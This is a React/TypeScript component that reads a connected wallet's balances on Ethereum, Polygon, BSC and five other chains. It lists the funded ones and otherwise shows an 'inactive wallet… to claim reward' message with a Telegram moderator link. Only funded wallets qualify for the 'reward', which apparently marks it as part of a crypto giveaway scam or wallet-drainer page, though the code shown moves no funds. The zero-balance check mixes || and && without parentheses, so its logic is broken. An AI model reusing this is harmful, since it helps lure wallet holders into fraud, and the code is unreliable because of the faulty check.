import React, { useEffect } from 'react';
import { useBalance, useAccount } from 'wagmi';
import { mainnet, polygon, bsc, sepolia, optimism, arbitrum, base, zkSync } from 'wagmi/chains';
import styles from './WalletBalances.module.css';

type WalletBalancesProps = {
  onBalancesChange: (balances: {
    ethBalance: string;
    maticBalance: string;
    bnbBalance: string;
    sepoliaBalance: string;
    optimismBalance: string;
    arbitrumBalance: string;
    baseBalance: string;
    zkSyncBalance: string;
  }) => void;
};

const WalletBalances: React.FC<WalletBalancesProps> = ({ onBalancesChange }) => {
  const { address, isConnected } = useAccount();

  // Fetch balances from various chains
  const { data: ethBalance } = useBalance({ address, chainId: mainnet.id });
  const { data: maticBalance } = useBalance({ address, chainId: polygon.id });
  const { data: bnbBalance } = useBalance({ address, chainId: bsc.id });
  const { data: sepoliaBalance } = useBalance({ address, chainId: sepolia.id });
  const { data: optimismBalance } = useBalance({ address, chainId: optimism.id });
  const { data: arbitrumBalance } = useBalance({ address, chainId: arbitrum.id });
  const { data: baseBalance } = useBalance({ address, chainId: base.id });
  const { data: zkSyncBalance } = useBalance({ address, chainId: zkSync.id });

  // Notify parent component of balance changes
  useEffect(() => {
    onBalancesChange({
      ethBalance: ethBalance?.formatted || '0',
      maticBalance: maticBalance?.formatted || '0',
      bnbBalance: bnbBalance?.formatted || '0',
      sepoliaBalance: sepoliaBalance?.formatted || '0',
      optimismBalance: optimismBalance?.formatted || '0',
      arbitrumBalance: arbitrumBalance?.formatted || '0',
      baseBalance: baseBalance?.formatted || '0',
      zkSyncBalance: zkSyncBalance?.formatted || '0',
    });
  }, [
    ethBalance,
    maticBalance,
    bnbBalance,
    sepoliaBalance,
    optimismBalance,
    arbitrumBalance,
    baseBalance,
    zkSyncBalance,
    onBalancesChange,
  ]);

  // Check if all balances are empty or zero
  const allBalancesZero =
    !ethBalance?.formatted || parseFloat(ethBalance.formatted) === 0 &&
    !maticBalance?.formatted || parseFloat(maticBalance.formatted) === 0 &&
    !bnbBalance?.formatted || parseFloat(bnbBalance.formatted) === 0 &&
    !sepoliaBalance?.formatted || parseFloat(sepoliaBalance.formatted) === 0 &&
    !optimismBalance?.formatted || parseFloat(optimismBalance.formatted) === 0 &&
    !arbitrumBalance?.formatted || parseFloat(arbitrumBalance.formatted) === 0 &&
    !baseBalance?.formatted || parseFloat(baseBalance.formatted) === 0 &&
    !zkSyncBalance?.formatted || parseFloat(zkSyncBalance.formatted) === 0;

  // If the wallet is not connected or all balances are zero, show the inactive wallet message
  if (!isConnected || allBalancesZero) {
    return (
      <div className={styles.inactiveMessage}>
        <p>Inactive wallet, kindly connect an active wallet to claim reward.</p>
        <p>
          <a href="https://t.me/kanau" className={styles.moderatorLink}>
            Click to contact moderator
          </a>
        </p>
      </div>
    );
  }

  return (
    <div className={styles.walletBalances}>
      <h3 className={styles.title}>Wallet Details</h3>
      <p className={styles.walletAddress}>{address}</p>
      <div className={styles.balancesContainer}>
        {ethBalance && parseFloat(ethBalance.formatted) > 0 && (
          <p className={styles.balanceItem}>
            <span className={styles.token}>Ethereum (ETH):</span> {ethBalance.formatted} ETH
          </p>
        )}
        {maticBalance && parseFloat(maticBalance.formatted) > 0 && (
          <p className={styles.balanceItem}>
            <span className={styles.token}>Polygon (MATIC):</span> {maticBalance.formatted} MATIC
          </p>
        )}
        {bnbBalance && parseFloat(bnbBalance.formatted) > 0 && (
          <p className={styles.balanceItem}>
            <span className={styles.token}>Binance Smart Chain (BNB):</span> {bnbBalance.formatted} BNB
          </p>
        )}
        {sepoliaBalance && parseFloat(sepoliaBalance.formatted) > 0 && (
          <p className={styles.balanceItem}>
            <span className={styles.token}>Sepolia (SEP):</span> {sepoliaBalance.formatted} SEP
          </p>
        )}
        {optimismBalance && parseFloat(optimismBalance.formatted) > 0 && (
          <p className={styles.balanceItem}>
            <span className={styles.token}>Optimism (OPT):</span> {optimismBalance.formatted} OPT
          </p>
        )}
        {arbitrumBalance && parseFloat(arbitrumBalance.formatted) > 0 && (
          <p className={styles.balanceItem}>
            <span className={styles.token}>Arbitrum (ARB):</span> {arbitrumBalance.formatted} ARB
          </p>
        )}
        {baseBalance && parseFloat(baseBalance.formatted) > 0 && (
          <p className={styles.balanceItem}>
            <span className={styles.token}>Base (BASE):</span> {baseBalance.formatted} BASE
          </p>
        )}
        {zkSyncBalance && parseFloat(zkSyncBalance.formatted) > 0 && (
          <p className={styles.balanceItem}>
            <span className={styles.token}>zkSync (ZKS):</span> {zkSyncBalance.formatted} ZKS
          </p>
        )}
      </div>
    </div>
  );
};

export default WalletBalances;
